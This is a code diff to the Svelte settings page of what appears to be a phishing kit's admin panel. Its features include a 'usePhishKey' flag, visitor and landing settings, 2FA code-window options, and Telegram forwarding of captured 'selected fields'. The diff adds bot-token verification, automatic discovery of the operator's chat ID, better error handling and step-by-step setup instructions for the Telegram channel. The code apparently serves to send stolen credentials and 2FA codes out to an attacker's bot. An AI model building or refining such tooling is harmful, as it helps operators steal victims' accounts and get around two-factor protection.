@@ -71,6 +71,11 @@
 		return reasons.length === 0 ? '' : `Test Connection requires ${reasons.join(' and ')}.`;
 	});
 
+	let botInfo: { username: string; firstName: string } | null = $state(null);
+	let verifyingBot = $state(false);
+	let discoveringChats = $state(false);
+	let discoveredChats: { chatId: string; title: string; type: string }[] = $state([]);
+
 	// Visitor settings
 	let landingEnabled = $state(true);
 	let usePhishKey = $state(false);
@@ -111,14 +116,18 @@
 			const g = await fetch('/api/settings/general').then((r) => r.json());
 			standard2faWindow = g.settings['general.standard_2fa_window_60s'] !== '0';
 			authenticatorWindow = g.settings['general.authenticator_window_60s'] !== '0';
-		} catch {}
+		} catch {
+			toast.error('Failed to load general settings');
+		}
 		try {
 			const t = await fetch('/api/settings/telegram').then((r) => r.json());
 			tgEnabled = !!t.enabled;
 			tgBotToken = t.botToken || '';
 			tgChatId = t.chatId || '';
 			tgFields = t.fields || tgFields;
-		} catch {}
+		} catch {
+			toast.error('Failed to load Telegram settings');
+		}
 		await loadVisitorSettings();
 		syncFromVisitorStore();
 	}
@@ -182,8 +191,8 @@
 				headers: { 'Content-Type': 'application/json' },
 				body: JSON.stringify({
 					enabled: tgEnabled,
-					botToken: tgBotToken,
-					chatId: tgChatId,
+					botToken: tgBotToken.trim(),
+					chatId: tgChatId.trim(),
 					fields: tgFields
 				})
 			});
@@ -194,6 +203,65 @@
 		} finally {
 			savingTg = false;
 		}
+	}
+
+	async function verifyBot() {
+		if (!tgBotToken.trim()) {
+			toast.error('Enter your bot token first');
+			return;
+		}
+		verifyingBot = true;
+		botInfo = null;
+		try {
+			const res = await fetch('/api/settings/telegram/verify', {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json' },
+				body: JSON.stringify({ botToken: tgBotToken.trim() })
+			});
+			const data = await res.json();
+			if (data.ok && data.bot) {
+				botInfo = { username: data.bot.username, firstName: data.bot.firstName };
+				toast.success(`Connected to @${data.bot.username || 'bot'}`);
+			} else {
+				toast.error(data.error || 'Could not verify bot token');
+			}
+		} catch {
+			toast.error('Could not reach Telegram API');
+		} finally {
+			verifyingBot = false;
+		}
+	}
+
+	async function findChats() {
+		if (!tgBotToken.trim()) {
+			toast.error('Enter your bot token first');
+			return;
+		}
+		discoveringChats = true;
+		discoveredChats = [];
+		try {
+			const res = await fetch('/api/settings/telegram/chats', {
+				method: 'POST',
+				headers: { 'Content-Type': 'application/json' },
+				body: JSON.stringify({ botToken: tgBotToken.trim() })
+			});
+			const data = await res.json();
+			if (data.ok && data.chats?.length) {
+				discoveredChats = data.chats;
+				toast.success(`Found ${data.chats.length} chat(s)`);
+			} else {
+				toast.error(data.error || 'No chats found');
+			}
+		} catch {
+			toast.error('Could not reach Telegram API');
+		} finally {
+			discoveringChats = false;
+		}
+	}
+
+	function pickChat(chatId: string) {
+		tgChatId = chatId;
+		toast.success('Chat ID applied — click Save Settings');
 	}
 
 	function requestTestConnection() {
@@ -511,11 +579,54 @@
 									{#if showToken}<EyeOff size={12} />{:else}<Eye size={12} />{/if}
 								</button>
 							</div>
+							<div class="mt-2 flex flex-wrap items-center gap-2">
+								<button
+									type="button"
+									onclick={verifyBot}
+									disabled={verifyingBot || !tgBotToken.trim()}
+									class="flex items-center gap-1.5 rounded-md border border-[var(--border)] px-3 py-1.5 text-[10px] text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)] disabled:opacity-50"
+								>
+									{#if verifyingBot}<RefreshCw size={10} class="animate-spin" />{:else}<CheckCircle size={10} />{/if}
+									Verify bot
+								</button>
+								{#if botInfo}
+									<span class="text-[10px] text-[var(--status-live)]">
+										@{botInfo.username} ({botInfo.firstName})
+									</span>
+								{/if}
+							</div>
 						</div>
 
 						<div>
 							<label class="mb-1 block text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Chat ID</label>
 							<input bind:value={tgChatId} type="text" placeholder="-1003289721172 (group) or 123456 (user)" class="w-full rounded-md border border-[var(--border)] bg-[var(--input)] px-3 py-2 font-mono text-xs text-[var(--foreground)] focus:border-[var(--accent-primary)] focus:outline-none" />
+							<div class="mt-2 flex flex-wrap items-center gap-2">
+								<button
+									type="button"
+									onclick={findChats}
+									disabled={discoveringChats || !tgBotToken.trim()}
+									class="flex items-center gap-1.5 rounded-md border border-[var(--border)] px-3 py-1.5 text-[10px] text-[var(--muted-foreground)] hover:bg-[var(--accent)] hover:text-[var(--foreground)] disabled:opacity-50"
+								>
+									{#if discoveringChats}<RefreshCw size={10} class="animate-spin" />{:else}<RefreshCw size={10} />{/if}
+									Find chat ID
+								</button>
+								<span class="text-[10px] text-[var(--text-tertiary)]">Message your bot with /start first</span>
+							</div>
+							{#if discoveredChats.length > 0}
+								<div class="mt-2 space-y-1 rounded-md border border-[var(--border)] bg-[var(--input)]/20 p-2">
+									<p class="text-[10px] font-semibold uppercase tracking-wider text-[var(--muted-foreground)]">Recent chats</p>
+									{#each discoveredChats as chat}
+										<button
+											type="button"
+											onclick={() => pickChat(chat.chatId)}
+											class="flex w-full items-center justify-between gap-2 rounded px-2 py-1.5 text-left text-xs hover:bg-[var(--accent)]"
+										>
+											<span class="truncate text-[var(--foreground)]">{chat.title}</span>
+											<span class="shrink-0 font-mono text-[10px] text-[var(--muted-foreground)]">{chat.chatId}</span>
+										</button>
+									{/each}
+								</div>
+							{/if}
 						</div>
 
 						<div>
@@ -569,11 +680,12 @@
 						selected fields will be sent to the configured Telegram chat. Use the Test Connection
 						button to verify everything is wired correctly before going live.
 					</p>
-					<p class="mt-3 text-[11px] text-[var(--muted-foreground)]">
-						Need a token? Open <code class="rounded bg-[var(--accent)]/30 px-1 font-mono">@BotFather</code> in
-						Telegram, run <code class="rounded bg-[var(--accent)]/30 px-1 font-mono">/newbot</code>, and
-						use the bot token + your chat's ID here.
-					</p>
+					<ol class="mt-3 list-decimal space-y-2 pl-4 text-[11px] text-[var(--muted-foreground)]">
+						<li>Open <code class="rounded bg-[var(--accent)]/30 px-1 font-mono">@BotFather</code> → <code class="rounded bg-[var(--accent)]/30 px-1 font-mono">/newbot</code> → copy the <b>bot token</b>.</li>
+						<li>In Telegram, open your bot and send <code class="rounded bg-[var(--accent)]/30 px-1 font-mono">/start</code>.</li>
+						<li>Paste the token here → <b>Verify bot</b> → <b>Find chat ID</b> → pick your chat.</li>
+						<li><b>Save Settings</b>, enable notifications, then <b>Test Connection</b>.</li>
+					</ol>
 				</div>
 			</div>
 		</div>
